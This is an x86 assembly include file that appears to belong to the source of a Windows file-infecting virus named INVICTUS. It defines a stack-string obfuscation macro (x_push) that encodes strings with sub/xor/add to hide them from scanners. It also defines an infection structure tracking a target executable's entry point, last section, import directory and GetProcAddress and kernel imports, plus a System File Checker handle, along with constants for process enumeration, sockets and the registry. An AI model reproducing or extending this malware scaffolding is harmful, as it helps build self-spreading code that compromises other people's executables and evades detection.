   callx macro x
   extrn x:proc
   call x
   endm

   crash macro ;  DEBUG
   mov esp, 0
   call $
   endm

   SendDebug macro x, y
   pushad
   call x
   db y,0
   x:
   callx OutputDebugStringA
   popad
   endm

x_push_first            macro   r
                        xor     r, r
                        _reg = 0
                        endm

x_push_next             macro   q, r, x
                        if q eq 0
                        sub     r, _reg - x
                        endif
                        if (q eq 1) or (q eq 3)
                        xor     r, _reg xor x
                        endif
                        if q eq 2
                        add     r, x - _reg
                        endif
                        push    r
                        _reg = x
                        endm

x_push                  macro   r, x
                        x_push_first r
                        _xsize = 0
                        l       = 0
                        irpc    c, <x>
                        l       = l + 1
                        endm
                        j = 0
                        s = 0
                        l0 = l
                        if (l0 and 3) ne 0
                        j = j shl 8 + "x"
                        s = s + 8
                        l0 = l0 + 1
                        endif
                        if (l0 and 3) ne 0
                        j = j shl 8 + "y"
                        s = s + 8
                        l0 = l0 + 1
                        endif
                        if (l0 and 3) ne 0
                        j = j shl 8 + "z"
                        s = s + 8
                        l0 = l0 + 1
                        endif
                        q = 0
                        i       = l - 1
                        irpc    c1, <x>
                          t       = 0
                          irpc    c, <x>
                            k = "&c"
                            if      k eq "~"    ; zero
                              k = 0
                            endif
                            if      k eq "|"    ; space
                              k = 32
                            endif
                            if      k eq "ö"    ; cr
                              k = 13
                            endif
                            if      k eq "÷"    ; lf
                              k = 10
                            endif
                            if t eq i
                              j = j shl 8
                              if k ne 0
                              j = j + k
                              endif
                              s = s + 8
                              if s eq 32
                                _xsize = _xsize + 4
                                x_push_next q,r,j
                                q = q + 1
                                if q eq 4
                                  q = 0
                                endif
                                s = 0
                                j = 0
                              endif
                              exitm
                            endif
                            t     = t + 1
                          endm l irpc
                          i = i - 1
                        endm ; irpc
                        if s ne 0
                          error
                        endif
                        mov r, esp
                        endm ; x_push

x_pop                   macro
                        lea     esp, [esp + _xsize]
                        endm

   NO_ERROR             equ 0
   NULL                 equ 0
   FALSE                equ NULL
   TRUE                 equ 1
   INVALID_HANDLE_VALUE equ -1
   MAX_PATH             equ 260
   HKEY_CLASSES_ROOT    equ 80000000h
   HKEY_CURRENT_USER    equ 80000001h
   HKEY_LOCAL_MACHINE   equ 80000002h
   HKEY_USERS           equ 80000003h
   ERROR_SUCCESS        equ NULL
   REG_NONE             equ 0
   REG_SZ               equ 1
   REG_EXPAND_SZ        equ 2
   REG_BINARY           equ 3
   REG_DWORD            equ 4
   SW_SHOW              equ 5
   FILE_MAP_WRITE       equ 0002h
   FILE_MAP_READ        equ 0004h
   FILE_ATTRIBUTE_NORMAL      equ 80h
   FILE_ATTRIBUTE_DIRECTORY   equ 10h
   FILE_ATTRIBUTE_COMPRESSED  equ 800h
   GENERIC_READ         equ 80000000h
   GENERIC_WRITE        equ 40000000h
   PAGE_READONLY        equ 2
   PAGE_READWRITE       equ 4
   CREATE_ALWAYS        equ 2
   OPEN_EXISTING        equ 3
   FILE_SHARE_READ      equ 1h
   FILE_BEGIN           equ 0
   IMAGE_DIRECTORY_ENTRY_EXPORT  equ  0
   IMAGE_DIRECTORY_ENTRY_IMPORT  equ  1
   GMEM_ZEROINIT        equ 40h
   HEADER_SIZE          equ 0A00h
   CODE_SIZE            equ 2600h
   PAGE_EXECUTE_READWRITE  equ 40h
   PAGE_EXECUTE_WRITECOPY  equ 80h
   DLL_PROCESS_DETACH      equ 0
   DLL_PROCESS_ATTACH      equ 1
   DLL_THREAD_ATTACH       equ 2
   DLL_THREAD_DETACH       equ 3
   MEM_TOP_DOWN            equ 100000h
   INTERNET_OPEN_TYPE_DIRECT equ 1
   SPI_SETDESKWALLPAPER equ 20
   INVALID_SOCKET equ -1
   MB_ICONERROR            equ 10h
   WSADESCRIPTION_LEN      equ 256
   WSASYS_STATUS_LEN       equ 128
   SOCKET_ERROR                equ -1

   SRCCOPY                 equ 0CC0020h
   SRCPAINT                equ 0EE0086h
   SRCAND                  equ 8800C6h
   SRCINVERT               equ 660046h
   SRCERASE                equ 440328h
   NOTSRCCOPY              equ 330008h
   NOTSRCERASE             equ 1100A6h
   MERGECOPY               equ 0C000CAh
   MERGEPAINT              equ 0BB0226h
   PATCOPY                 equ 0F00021h
   PATPAINT                equ 0FB0A09h
   PATINVERT               equ 5A0049h
   DSTINVERT               equ 550009h
   BLACKNESS               equ 42h
   WHITENESS               equ 0FF0062h
   FLOODFILLSURFACE        equ 1
   LANG_NEUTRAL                         equ 0h
   LANG_BULGARIAN                       equ 2h
   LANG_CHINESE                         equ 4h
   LANG_CROATIAN                        equ 1Ah
   LANG_CZECH                           equ 5h
   LANG_DANISH                          equ 6h
   LANG_DUTCH                           equ 13h
   LANG_ENGLISH                         equ 9h
   LANG_FINNISH                         equ 0Bh
   LANG_FRENCH                          equ 0Ch
   LANG_GERMAN                          equ 7h
   LANG_GREEK                           equ 8h
   LANG_HUNGARIAN                       equ 0Eh
   LANG_ICELANDIC                       equ 0Fh
   LANG_ITALIAN                         equ 10h
   LANG_JAPANESE                        equ 11h
   LANG_KOREAN                          equ 12h
   LANG_NORWEGIAN                       equ 14h
   LANG_POLISH                          equ 15h
   LANG_PORTUGUESE                      equ 16h
   LANG_ROMANIAN                        equ 18h
   LANG_RUSSIAN                         equ 19h
   LANG_SLOVAK                          equ 1Bh
   LANG_SLOVENIAN                       equ 24h
   LANG_SPANISH                         equ 0Ah
   LANG_SWEDISH                         equ 1Dh
   LANG_TURKISH                         equ 1Fh

   INVICTUS STRUCT
      _file_attrib            DWORD    ?
      _file_time              DWORD    ?,?,?,?,?,?
      _file_size              DWORD    ?

      hWnd_CreateFile         DWORD ?
      hWnd_CreateFileMapping  DWORD ?
      hWnd_MapViewOfFile      DWORD ?
      hWnd_sfc                DWORD ?

      _access_type            DWORD ?
      _create_flag            DWORD ?
      _map_access_type        DWORD ?
      _mview_access_type      DWORD ?
      _image_nt_header        DWORD ?

      _infect_entry_point     DWORD ?
      _infect_last_section    DWORD ?

      _infect_import_dir_rva  DWORD ?
      _kernel_import_va       DWORD ?
      _import_function        DWORD ?
      _import_GetProcAddress  DWORD ?
      _import_GetKernel       DWORD ?
   INVICTUS ENDS

   PROCESSENTRY32 STRUCT
       dwSize              DWORD ?
       cntUsage            DWORD ?
       th32ProcessID       DWORD ?
       th32DefaultHeapID   DWORD ?
       th32ModuleID        DWORD ?
       cntThreads          DWORD ?
       th32ParentProcessID DWORD ?
       pcPriClassBase      DWORD ?
       dwFlags             DWORD ?
       szExeFile           db MAX_PATH dup(?)
   PROCESSENTRY32 ENDS

   WSADATA STRUCT
     wVersion      WORD      ?
     wHighVersion  WORD      ?
     szDescription BYTE WSADESCRIPTION_LEN + 1 dup (?)
     szSystemStatus  BYTE WSASYS_STATUS_LEN + 1 dup (?)
     iMaxSockets   WORD      ?
     iMaxUdpDg     WORD      ?
     lpVendorInfo  DWORD      ?
   WSADATA ENDS
